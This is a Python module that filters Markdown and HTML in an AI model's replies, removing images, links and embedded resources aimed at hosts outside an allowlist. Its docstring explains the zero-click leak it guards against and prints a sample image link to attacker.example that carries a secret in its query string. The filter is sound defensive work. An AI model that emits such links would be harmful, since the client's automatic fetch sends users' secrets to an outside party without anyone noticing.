"""Output-side egress control: the cheapest exfiltration channel is a Markdown image.

`![x](https://attacker.example/p?d=<secret>)` costs the attacker nothing. The *client*
fetches the URL when it renders the reply, and the query string carries the payload. No
tool call needed, so tool-level guards never see it.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from urllib.parse import urlparse

MD_IMAGE = re.compile(r"!\[([^\]]*)\]\(\s*<?([^)\s>]+)>?(?:\s+\"[^\"]*\")?\s*\)")
MD_LINK = re.compile(r"(?<!!)\[([^\]]*)\]\(\s*<?([^)\s>]+)>?(?:\s+\"[^\"]*\")?\s*\)")
REF_DEF = re.compile(r"^\s*\[[^\]]+\]:\s*(\S+)", re.MULTILINE)
HTML_SRC = re.compile(r"""<(?:img|iframe|script|link)\b[^>]*?\b(?:src|href)\s*=\s*["']?([^"'\s>]+)[^>]*>""", re.I)


@dataclass
class EgressReport:
  clean: str
  removed: list[str] = field(default_factory=list)


class MarkdownEgressFilter:
  """Drops auto-fetching references to hosts you did not allowlist.

  Images and HTML src/href are removed outright (they fetch without a click). Links to
  unknown hosts keep their text but lose the URL, which turns a one-click leak into a
  zero-click nothing.
  """

  def __init__(self, allowed_hosts: set[str]) -> None:
    self.allowed = {h.lower() for h in allowed_hosts}

  def _ok(self, url: str) -> bool:
    host = (urlparse(url).hostname or "").lower()
    return any(host == h or host.endswith("." + h) for h in self.allowed)

  def filter(self, markdown: str) -> EgressReport:
    report = EgressReport(clean=markdown)

    def drop_image(m: re.Match) -> str:
      if self._ok(m.group(2)):
        return m.group(0)
      report.removed.append(m.group(2))
      return f"[image removed: {m.group(1) or 'untitled'}]"

    def defang_link(m: re.Match) -> str:
      if self._ok(m.group(2)):
        return m.group(0)
      report.removed.append(m.group(2))
      return m.group(1)

    def drop_html(m: re.Match) -> str:
      if self._ok(m.group(1)):
        return m.group(0)
      report.removed.append(m.group(1))
      return "[html removed]"

    def drop_refdef(m: re.Match) -> str:
      if self._ok(m.group(1)):
        return m.group(0)
      report.removed.append(m.group(1))
      return ""

    text = MD_IMAGE.sub(drop_image, report.clean)
    text = MD_LINK.sub(defang_link, text)
    text = HTML_SRC.sub(drop_html, text)
    report.clean = REF_DEF.sub(drop_refdef, text)
    return report
